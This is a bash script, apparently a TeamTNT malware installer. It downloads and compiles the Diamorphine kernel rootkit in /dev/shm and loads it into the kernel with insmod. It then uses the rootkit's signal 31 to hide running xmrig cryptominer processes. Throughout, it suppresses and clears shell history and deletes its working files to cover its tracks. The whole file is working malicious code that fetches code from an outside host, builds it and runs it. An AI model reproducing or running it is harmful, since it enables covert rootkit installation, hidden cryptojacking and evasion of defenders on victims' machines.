#!/bin/bash
#
#	TITLE:		Diamorphine-Installer
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	Diamorphine-Installer_V0.00.1
#	DATE:		13.09.2021
#
#	SRC:        http://teamtnt.red/sh/setup/diamorphine.sh
#
########################################################################

ulimit -n 65535
export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin


if [[ $(whoami) != "root" ]]; then echo 'run as root!'; exit; else

if type apt 2>/dev/null 1>/dev/null; then
apt-get update --fix-missing
apt-get -y install linux-headers-$(uname -r)
apt-get -y install make
apt-get -y install gcc
apt-get -y install git
fi

	if type yum 2>/dev/null 1>/dev/null; then
	yum -y install kernel-devel-$(uname -r)
	yum -y install make
	yum -y install gcc
	yum -y install git
	fi

		if type apk 2>/dev/null 1>/dev/null; then
		apk update
		apk add alpine-sdk 
		apk add linux-headers
		apk add make
		apk add install gcc
		apk add git
		fi



cd /dev/shm/
git clone git://github.com/m0nad/Diamorphine dia/
cd /dev/shm/dia/
make


if [[ -f "/dev/shm/dia/diamorphine.ko" ]]; then
echo "DIA COMPILE OKAY"
cp /dev/shm/dia/diamorphine.ko /etc/dia.ko
cd /etc/
insmod dia.ko

#XMR_PID=$(ps aux | grep -v grep | grep xmrig | awk '{print $2}')
#if [[ ! -z "$XMR_PID" ]]; then kill -31 $XMR_PID ; fi

ps aux | grep -v grep | grep xmrig | awk '{print $2}' > /dev/shm/tnths.dat
find /dev/shm/ -size 0 -exec rm -f {} \;
while read XMR_PID; do
kill -31 $XMR_PID 2>/dev/null 1>/dev/null
done < /dev/shm/tnths.dat
rm -f /dev/shm/tnths.dat 2>/dev/null 1>/dev/null


else
echo "DIA COMPILE FAIL"
fi

rm -fr /dev/shm/dia/

fi


history -c
clear

